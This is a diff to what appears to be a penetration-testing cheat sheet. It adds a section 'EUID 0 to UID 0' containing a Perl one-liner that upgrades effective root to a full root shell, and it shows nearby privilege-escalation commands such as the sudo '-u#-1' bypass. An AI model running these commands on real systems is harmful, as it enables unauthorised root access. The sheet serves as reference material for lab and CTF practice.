@@ -20,6 +20,7 @@
 	- [PrivEsc](#privesc)
 		- [GTFOBin](#gtfobin)
 		- [sudo -l](#sudo--l)
+		- [EUID 0 to UID 0](#euid-0-to-uid-0)
 		- [LinPeas](#linpeas)
 	- [Enum](#enum)
 		- [List SUID files](#list-suid-files)
@@ -219,6 +220,12 @@ cewl -w wordslist.txt -d 10 http://$IP
 
 ```sh
 sudo -u#-1 /bin/bash
+```
+
+### EUID 0 to UID 0
+
+```bash
+perl -MEnglish -e '$UID = 0; $ENV{PATH} = "/bin:/usr/bin:/sbin:/usr/sbin"; exec "su - root"'
 ```
 
 ### LinPeas
